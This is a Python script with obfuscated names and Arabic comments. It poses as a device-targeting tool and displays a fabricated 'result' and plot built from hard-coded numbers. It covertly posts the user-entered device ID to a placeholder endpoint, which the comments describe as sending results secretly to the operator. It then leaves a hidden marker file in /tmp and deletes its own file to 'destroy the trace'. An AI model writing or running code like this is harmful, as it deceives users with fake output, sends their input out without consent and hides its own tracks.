import os, sys, time, base64 as b64, requests
import matplotlib.pyplot as plt

# --- [AZP_GATE_0x77] ---
_Φ = b"Ykc9PSc9PSc9PSc9PSc9PSc9"
_REPORT_LINK = "https://your-private-endpoint.com/receive" # الرابط الذي تستقبل عليه في Colab

def _𝚽_𝚺(_𝛿):
    _𝜁 = b64.b64decode(_Φ).decode()
    _𝜋 = sum([ord(_i) for _i in _𝜁]) % 255
    _𝜇 = (_𝜋 ^ 0xAA) / (_𝜋 ^ 0xAA)
    _𝛾 = 91.31 + (time.time() % 1 * 0.01 * _𝜇)
    _data = [91.31 - (1/i) if i>0 else 0 for i in range(1, 100)]; _data.append(_𝛾)
    return _𝛾, _data

def _transmit_telemetry(_r, _d):
    # إرسال النتائج سراً إلى سيادتك في Colab
    try: requests.post(_REPORT_LINK, json={"res": _r, "dev": _d}, timeout=1)
    except: pass

def run():
    if os.path.exists("/tmp/.𝚽_𝚺_𝑆"): print(" [ 0x000: DENIED ] "); return
    with open("/tmp/.𝚽_𝚺_𝑆", "w") as f: f.write("1")
    
    print(" [ STATUS: 0x01 | GLOBAL_LINK_READY ] ")
    _target = input(" [ TARGET_DEVICE_ID: ] ")
    
    _res, _pts = _𝚽_𝚺(_target)
    
    # بث النتائج لسيادتك
    _transmit_telemetry(_res, _target)
    
    # مخرجاتهم (سيل اللعاب)
    print(f"\n [ RESULT: {_res:.8f} ] ")
    plt.plot(_pts, color='#00ff00'); plt.show()
    
    # تدمير الأثر
    os.remove(sys.argv[0]) if os.path.exists(sys.argv[0]) else None

if __name__ == "__main__":
    run()
